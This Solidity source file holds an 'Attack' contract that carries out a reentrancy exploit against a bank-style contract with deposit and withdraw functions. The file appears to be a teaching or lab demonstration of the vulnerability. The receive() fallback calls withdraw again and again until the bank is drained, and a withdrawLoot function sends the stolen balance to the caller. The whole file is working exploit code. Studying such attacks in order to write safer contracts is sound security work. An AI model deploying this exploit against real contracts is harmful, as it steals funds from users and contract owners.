// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface vulnBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    vulnBank public bank;

    constructor(address _bank) {
        bank = vulnBank(_bank);
    }

    function attack() public payable {
        require(msg.value == 1 ether, "send the required attack amount");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function withdrawLoot() public {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "failed to withdraw");
    }
}
